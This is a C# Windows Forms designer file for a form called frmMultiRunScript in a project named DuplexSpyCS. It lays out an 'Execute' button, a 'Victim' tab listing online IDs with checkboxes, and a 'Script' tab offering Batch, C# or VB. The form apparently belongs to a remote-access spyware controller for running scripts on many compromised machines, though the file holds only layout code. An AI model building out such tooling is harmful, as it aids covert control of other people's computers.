namespace DuplexSpyCS
{
    partial class frmMultiRunScript
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmMultiRunScript));
            toolStrip1 = new ToolStrip();
            toolStripButton1 = new ToolStripButton();
            toolStripSeparator1 = new ToolStripSeparator();
            toolStripButton3 = new ToolStripButton();
            toolStripButton4 = new ToolStripButton();
            toolStripSeparator2 = new ToolStripSeparator();
            toolStripButton2 = new ToolStripButton();
            statusStrip1 = new StatusStrip();
            toolStripStatusLabel1 = new ToolStripStatusLabel();
            tabControl1 = new TabControl();
            tabPage1 = new TabPage();
            splitContainer1 = new SplitContainer();
            listView1 = new ListView();
            columnHeader1 = new ColumnHeader();
            columnHeader2 = new ColumnHeader();
            richTextBox1 = new RichTextBox();
            tabPage2 = new TabPage();
            toolStrip2 = new ToolStrip();
            toolStripLabel1 = new ToolStripLabel();
            toolStripComboBox1 = new ToolStripComboBox();
            toolStrip1.SuspendLayout();
            statusStrip1.SuspendLayout();
            tabControl1.SuspendLayout();
            tabPage1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)splitContainer1).BeginInit();
            splitContainer1.Panel1.SuspendLayout();
            splitContainer1.Panel2.SuspendLayout();
            splitContainer1.SuspendLayout();
            tabPage2.SuspendLayout();
            toolStrip2.SuspendLayout();
            SuspendLayout();
            // 
            // toolStrip1
            // 
            toolStrip1.Font = new Font("Microsoft JhengHei UI", 11.25F, FontStyle.Regular, GraphicsUnit.Point);
            toolStrip1.Items.AddRange(new ToolStripItem[] { toolStripButton1, toolStripSeparator1, toolStripButton3, toolStripButton4, toolStripSeparator2, toolStripButton2 });
            toolStrip1.Location = new Point(0, 0);
            toolStrip1.Name = "toolStrip1";
            toolStrip1.Size = new Size(776, 26);
            toolStrip1.TabIndex = 0;
            toolStrip1.Text = "toolStrip1";
            // 
            // toolStripButton1
            // 
            toolStripButton1.DisplayStyle = ToolStripItemDisplayStyle.Text;
            toolStripButton1.Image = (Image)resources.GetObject("toolStripButton1.Image");
            toolStripButton1.ImageTransparentColor = Color.Magenta;
            toolStripButton1.Name = "toolStripButton1";
            toolStripButton1.Size = new Size(65, 23);
            toolStripButton1.Text = "Execute";
            toolStripButton1.Click += toolStripButton1_Click;
            // 
            // toolStripSeparator1
            // 
            toolStripSeparator1.Name = "toolStripSeparator1";
            toolStripSeparator1.Size = new Size(6, 26);
            // 
            // toolStripButton3
            // 
            toolStripButton3.DisplayStyle = ToolStripItemDisplayStyle.Text;
            toolStripButton3.Image = (Image)resources.GetObject("toolStripButton3.Image");
            toolStripButton3.ImageTransparentColor = Color.Magenta;
            toolStripButton3.Name = "toolStripButton3";
            toolStripButton3.Size = new Size(77, 23);
            toolStripButton3.Text = "Check All";
            toolStripButton3.Click += toolStripButton3_Click;
            // 
            // toolStripButton4
            // 
            toolStripButton4.DisplayStyle = ToolStripItemDisplayStyle.Text;
            toolStripButton4.Image = (Image)resources.GetObject("toolStripButton4.Image");
            toolStripButton4.ImageTransparentColor = Color.Magenta;
            toolStripButton4.Name = "toolStripButton4";
            toolStripButton4.Size = new Size(92, 23);
            toolStripButton4.Text = "Uncheck all";
            toolStripButton4.Click += toolStripButton4_Click;
            // 
            // toolStripSeparator2
            // 
            toolStripSeparator2.Name = "toolStripSeparator2";
            toolStripSeparator2.Size = new Size(6, 26);
            // 
            // toolStripButton2
            // 
            toolStripButton2.DisplayStyle = ToolStripItemDisplayStyle.Text;
            toolStripButton2.Image = (Image)resources.GetObject("toolStripButton2.Image");
            toolStripButton2.ImageTransparentColor = Color.Magenta;
            toolStripButton2.Name = "toolStripButton2";
            toolStripButton2.Size = new Size(45, 23);
            toolStripButton2.Text = "Help";
            toolStripButton2.Click += toolStripButton2_Click;
            // 
            // statusStrip1
            // 
            statusStrip1.Font = new Font("Microsoft JhengHei UI", 11.25F, FontStyle.Regular, GraphicsUnit.Point);
            statusStrip1.Items.AddRange(new ToolStripItem[] { toolStripStatusLabel1 });
            statusStrip1.Location = new Point(0, 444);
            statusStrip1.Name = "statusStrip1";
            statusStrip1.Size = new Size(776, 24);
            statusStrip1.TabIndex = 1;
            statusStrip1.Text = "statusStrip1";
            // 
            // toolStripStatusLabel1
            // 
            toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            toolStripStatusLabel1.Size = new Size(158, 19);
            toolStripStatusLabel1.Text = "toolStripStatusLabel1";
            // 
            // tabControl1
            // 
            tabControl1.Controls.Add(tabPage1);
            tabControl1.Controls.Add(tabPage2);
            tabControl1.Dock = DockStyle.Fill;
            tabControl1.Location = new Point(0, 26);
            tabControl1.Name = "tabControl1";
            tabControl1.SelectedIndex = 0;
            tabControl1.Size = new Size(776, 418);
            tabControl1.SizeMode = TabSizeMode.Fixed;
            tabControl1.TabIndex = 2;
            tabControl1.KeyDown += tabControl1_KeyDown;
            // 
            // tabPage1
            // 
            tabPage1.Controls.Add(splitContainer1);
            tabPage1.Location = new Point(4, 28);
            tabPage1.Name = "tabPage1";
            tabPage1.Padding = new Padding(3);
            tabPage1.Size = new Size(768, 386);
            tabPage1.TabIndex = 0;
            tabPage1.Text = "Victim";
            tabPage1.UseVisualStyleBackColor = true;
            // 
            // splitContainer1
            // 
            splitContainer1.Dock = DockStyle.Fill;
            splitContainer1.FixedPanel = FixedPanel.Panel2;
            splitContainer1.Location = new Point(3, 3);
            splitContainer1.Name = "splitContainer1";
            splitContainer1.Orientation = Orientation.Horizontal;
            // 
            // splitContainer1.Panel1
            // 
            splitContainer1.Panel1.Controls.Add(listView1);
            // 
            // splitContainer1.Panel2
            // 
            splitContainer1.Panel2.Controls.Add(richTextBox1);
            splitContainer1.Size = new Size(762, 380);
            splitContainer1.SplitterDistance = 190;
            splitContainer1.TabIndex = 1;
            // 
            // listView1
            // 
            listView1.CheckBoxes = true;
            listView1.Columns.AddRange(new ColumnHeader[] { columnHeader1, columnHeader2 });
            listView1.Dock = DockStyle.Fill;
            listView1.FullRowSelect = true;
            listView1.Location = new Point(0, 0);
            listView1.Name = "listView1";
            listView1.Size = new Size(762, 190);
            listView1.TabIndex = 0;
            listView1.UseCompatibleStateImageBehavior = false;
            listView1.View = View.Details;
            // 
            // columnHeader1
            // 
            columnHeader1.Text = "Online ID";
            columnHeader1.Width = 200;
            // 
            // columnHeader2
            // 
            columnHeader2.Text = "Status";
            columnHeader2.Width = 200;
            // 
            // richTextBox1
            // 
            richTextBox1.Dock = DockStyle.Fill;
            richTextBox1.Location = new Point(0, 0);
            richTextBox1.Name = "richTextBox1";
            richTextBox1.Size = new Size(762, 186);
            richTextBox1.TabIndex = 0;
            richTextBox1.Text = "";
            // 
            // tabPage2
            // 
            tabPage2.Controls.Add(toolStrip2);
            tabPage2.Location = new Point(4, 24);
            tabPage2.Name = "tabPage2";
            tabPage2.Padding = new Padding(3);
            tabPage2.Size = new Size(768, 390);
            tabPage2.TabIndex = 1;
            tabPage2.Text = "Script";
            tabPage2.UseVisualStyleBackColor = true;
            // 
            // toolStrip2
            // 
            toolStrip2.Font = new Font("Microsoft JhengHei UI", 11.25F, FontStyle.Regular, GraphicsUnit.Point);
            toolStrip2.Items.AddRange(new ToolStripItem[] { toolStripLabel1, toolStripComboBox1 });
            toolStrip2.Location = new Point(3, 3);
            toolStrip2.Name = "toolStrip2";
            toolStrip2.Size = new Size(762, 27);
            toolStrip2.TabIndex = 1;
            toolStrip2.Text = "toolStrip2";
            // 
            // toolStripLabel1
            // 
            toolStripLabel1.Name = "toolStripLabel1";
            toolStripLabel1.Size = new Size(86, 24);
            toolStripLabel1.Text = "Language :";
            // 
            // toolStripComboBox1
            // 
            toolStripComboBox1.Font = new Font("Microsoft JhengHei UI", 11.25F, FontStyle.Regular, GraphicsUnit.Point);
            toolStripComboBox1.Items.AddRange(new object[] { "Batch", "C#", "VB" });
            toolStripComboBox1.Name = "toolStripComboBox1";
            toolStripComboBox1.Size = new Size(121, 27);
            toolStripComboBox1.SelectedIndexChanged += toolStripComboBox1_SelectedIndexChanged;
            // 
            // frmMultiRunScript
            // 
            AutoScaleDimensions = new SizeF(9F, 19F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(776, 468);
            Controls.Add(tabControl1);
            Controls.Add(statusStrip1);
            Controls.Add(toolStrip1);
            Font = new Font("Microsoft JhengHei UI", 11.25F, FontStyle.Regular, GraphicsUnit.Point);
            Icon = (Icon)resources.GetObject("$this.Icon");
            Margin = new Padding(4);
            Name = "frmMultiRunScript";
            StartPosition = FormStartPosition.CenterScreen;
            Text = "frmMultiRunScript";
            FormClosed += frmMultiRunScript_FormClosed;
            Load += frmMultiRunScript_Load;
            toolStrip1.ResumeLayout(false);
            toolStrip1.PerformLayout();
            statusStrip1.ResumeLayout(false);
            statusStrip1.PerformLayout();
            tabControl1.ResumeLayout(false);
            tabPage1.ResumeLayout(false);
            splitContainer1.Panel1.ResumeLayout(false);
            splitContainer1.Panel2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)splitContainer1).EndInit();
            splitContainer1.ResumeLayout(false);
            tabPage2.ResumeLayout(false);
            tabPage2.PerformLayout();
            toolStrip2.ResumeLayout(false);
            toolStrip2.PerformLayout();
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion

        private ToolStrip toolStrip1;
        private StatusStrip statusStrip1;
        private ToolStripStatusLabel toolStripStatusLabel1;
        private TabControl tabControl1;
        private TabPage tabPage1;
        private ListView listView1;
        private TabPage tabPage2;
        private ToolStripButton toolStripButton1;
        private ToolStripSeparator toolStripSeparator1;
        private ToolStripButton toolStripButton3;
        private ToolStripButton toolStripButton4;
        private ToolStrip toolStrip2;
        private ToolStripLabel toolStripLabel1;
        private ToolStripComboBox toolStripComboBox1;
        private SplitContainer splitContainer1;
        private RichTextBox richTextBox1;
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
        private ToolStripSeparator toolStripSeparator2;
        private ToolStripButton toolStripButton2;
    }
}